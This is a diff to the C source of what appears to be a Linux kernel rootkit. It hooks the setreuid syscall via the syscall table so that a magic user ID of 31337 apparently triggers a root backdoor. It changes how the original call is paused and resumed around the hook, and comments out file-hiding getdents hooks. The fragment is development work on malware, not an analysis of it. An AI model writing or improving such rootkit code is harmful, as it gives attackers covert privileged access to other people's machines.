@@ -9,6 +9,8 @@
 asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
 {
+    int ret;
+
     DEBUG("[trying]: ruid == %d && euid == %d\n", ruid, euid);
 
     if(ruid == 31337)
@@ -22,7 +24,11 @@ asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
         }
     }
 
-    return sys_setreuid(ruid, euid);
+    hook_pause(sys_setreuid);
+    ret = sys_setreuid(ruid, euid);
+    hook_resume(sys_setreuid);
+
+    return ret;
 }
 
 asmlinkage int (*sys_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
@@ -124,14 +130,15 @@ end:
 void init_hooks(void)
 {
     DEBUG("Hooking syscalls\n");
+
     sys_setreuid = (void *)sct[__NR_setreuid];
     hook_start(sys_setreuid, &n_sys_setreuid);
 
-    sys_getdents = (void *)sct[__NR_getdents];
-    hook_start(sys_getdents, &n_sys_getdents);
+    //sys_getdents = (void *)sct[__NR_getdents];
+    //hook_start(sys_getdents, &n_sys_getdents);
 
-    sys_getdents64 = (void *)sct[__NR_getdents64];
-    hook_start(sys_getdents64, &n_sys_getdents64);
+    //sys_getdents64 = (void *)sct[__NR_getdents64];
+    //hook_start(sys_getdents64, &n_sys_getdents64);
 }
 
 void exit_hooks(void)
@@ -139,6 +146,6 @@ void exit_hooks(void)
     DEBUG("Unhooking syscalls\n");
 
     hook_stop(sys_setreuid);
-    hook_stop(sys_getdents);
-    hook_stop(sys_getdents64);
+    //hook_stop(sys_getdents);
+    //hook_stop(sys_getdents64);
 }
